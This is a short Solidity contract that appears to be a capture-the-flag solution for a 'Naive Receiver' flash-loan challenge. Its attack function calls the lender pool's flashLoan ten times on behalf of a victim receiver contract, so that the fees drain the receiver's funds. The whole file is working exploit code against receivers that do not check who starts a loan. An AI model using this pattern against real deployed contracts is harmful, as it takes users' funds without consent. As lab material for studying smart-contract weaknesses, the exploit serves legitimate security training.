// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title NaiveReceiverAttacker
 */
contract NaiveReceiverAttacker {
    function attack(
        address payable pool,
        address receiver,
        address token,
        uint256 amount
    ) external {
        for (uint i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(
                IERC3156FlashBorrower(receiver),
                token,
                amount,
                ""
            );
        }
    }
}
